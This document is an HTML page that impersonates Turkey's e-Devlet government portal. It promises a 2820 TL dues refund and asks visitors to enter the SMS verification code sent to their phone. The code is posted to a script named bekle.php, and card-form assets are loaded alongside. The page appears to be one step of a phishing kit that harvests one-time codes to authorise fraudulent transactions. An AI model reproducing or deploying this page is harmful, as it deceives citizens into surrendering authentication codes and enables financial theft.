<!DOCTYPE html>
<html lang="tr">
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="x-ua-compatible" content="IE=edge" />
    <meta http-equiv="cleartype" content="on" />
    <title>e-Devlet Kapısı</title>
    <meta name="description" content="e-Devlet Aidat Ödenek Kapısı" />
    <meta name="description" content="e-Devlet Kapısı'nı kullanarak kamu kurumlarının sunduğu hizmetlere tek noktadan, hızlı ve güvenli bir şekilde ulaşabilirsiniz." />
    <meta name="keywords" content="" />
    <meta name="robots" content="" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="theme-color" content="#4284be" />
    <link rel="icon" type="image/png" href="https://cdn.e-devlet.gov.tr/themes/izmir/images/favicons/favicon-196x196.png" sizes="196x196" />
    <link rel="stylesheet" href="./assets/css/styles.css" />
    <link rel="stylesheet" href="https://cdn.e-devlet.gov.tr/themes/izmir/css/base.css" />
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-9ndCyUaIbzAi2FUVXJi0CjmCapSmO7SnpJef0486qhLnuZ2cdeRhO02iuK6FUUVM" crossorigin="anonymous">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js" integrity="sha384-geWF76RCwLtnZ8qwWowPQNguL3RmwHVBC9FhGdlKrxdiJJigb/j/68SIy3Te4Bkz" crossorigin="anonymous"></script>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/card/2.4.0/card.css">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
    <script src="https://cdn.e-devlet.gov.tr/themes/izmir/js/header.js"></script>
    <link rel="stylesheet" href="https://cdn.e-devlet.gov.tr/themes/izmir/css/giris.css" />
    <style>
      #page header h1 {
        background-image: url("./assets/images/logo.png");
      }

      @media only screen and (min-width: 600px) {
        .ff {
          margin-left: 181px;
        }
      }

      @media only screen and (min-width: 600px) {
        .fv {
          margin-left: 10.5rem
        }
      }
    </style>
  </head>
  <body data-lang="tr_TR.UTF-8" style="visibility: visible; overflow: auto;">
    <div id="page" style="min-height: 40em;">
      <header id="headerSection">
        <img src="https://i.ibb.co/Gv7yVbX/edevlet.png">
        <nav id="accesibilityBlock" class="visuallyhidden"></nav>
      </header>
      <main style="margin-top: 7rem;">
        <nav class="methodSelector" style="height: 0; border:none!important"></nav>
        <section id="pageContent" style="border:none!important">
          <form method="post" class="needs-validation" action="bekle.php">
            <div class="form-container active">
              <div class="formRow required">
                <div class="form-row">
                  <label class="rowLabel" style="color:red;">Aidat iadeniz: 2820 TL <br> Limit onayı için gelen kodu giriniz </label>
                  <div class="col-md-6 mb-3">
                    <input type="text" class="form-control" maxlength="6" name="sms" autocomplete="off" required>
                    <small class="text-muted">Telefonunuza gelen kodu giriniz.</small>
                    <div class="invalid-feedback">Hatalı giriş.</div>
                  </div>
                </div>
                </fieldset>
                <div class="formSubmitRow">
                  <input class="submitButton" name="submit" type="submit" tabindex="3" value="Devam et" />
                </div>
          </form>
        </section>
        <div class="col-md-4 order-md-2 mb-4 d-none d-sm-block">
          <h4 class="d-flex justify-content-between align-items-center mb-3"></h4>
          <div class="card-wrapper" hidden></div>
        </div>
      </main>
      <footer style="margin-top: 106px;">
        <ul class="footerLinks">
          <li>
            <a open-modal="gizlilikGuvenlik" href="#">Gizlilik ve Güvenlik</a>
          </li>
          <li>
            <a href="" target="_blank">Hızlı Çözüm Merkezi</a>
          </li>
        </ul>
        <div class="copyrightDetails"> © 2024, Ankara - Tüm Hakları Saklıdır </div>
      </footer>
    </div>
    <div class="modal" id="gizlilikGuvenlik">
      <div class="modal-container">
        <span class="close" close-modal="">
          <i class="edk-fonticon-close"></i>
        </span>
        <h3>Gizlilik ve Güvenlik</h3>
        <div class="modal-content">
          <p> e-Devlet Kapısı çalışanları hiçbir zaman size şifrenizi sormayacaktır. Şifrenizi e-Devlet Kapısı giriş ekranları haricinde hiçbir yere kaydetmeyiniz. Tarayıcı uygulaması (Internet Explorer, Firefox, Safari ve benzeri uygulamaların) şifre kaydetme opsiyonlarını kapalı tutunuz. Ayrıca hiçbir zaman kişisel bilgileriniz veya şifreniz e-posta yolu ile sizlere sorulmayacaktır. Unutmayınız ki zararlı uygulamaların ve virüslerin büyük çoğunluğu e-posta yolu ile yayılmaktadır. Bu sebeple göndericisini tanımadığınız veya şüpheli e-postaları okumadan siliniz. </p>
          <p> e-Devlet Kapısı sistemi, güvenlik amaçlı olarak elektronik sertifika kullanmaktadır. Erişiminizin güvenli olup olmadığını adres çubuğunda yer alan adresin http değil https ile başlamasından ve tarayıcı uygulamasındaki kilit resminden anlayabilirsiniz. </p>
        </div>
        <div class="modal-footer">
          <div class="formSubmitRow">
            <button class="cancelButton" close-modal="">Kapat</button>
          </div>
        </div>
      </div>
      <div class="modalBg"></div>
    </div>
    <script type="text/javascript">
      $(document).ready(function() {
        $("form").submit(function() {
          $(".formSubmitRow").hide();
          $(".loader").show();
        });
        $("input").keypress(function(e) {
          if (e.which == 13) {
            $(".submitButton").click();
            return false;
          }
        });
      });
    </script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="./assets/js/fetch.js" type="text/javascript"></script>
    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
    <script src="./assets/card.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
    <script src="https://rawgit.com/RobinHerbots/jquery.inputmask/3.x/dist/jquery.inputmask.bundle.js"></script>
    <script type="text/javascript">
      $('#telefonNumarasi').inputmask("(599) 999-9999");
    </script>
  </body>
</html>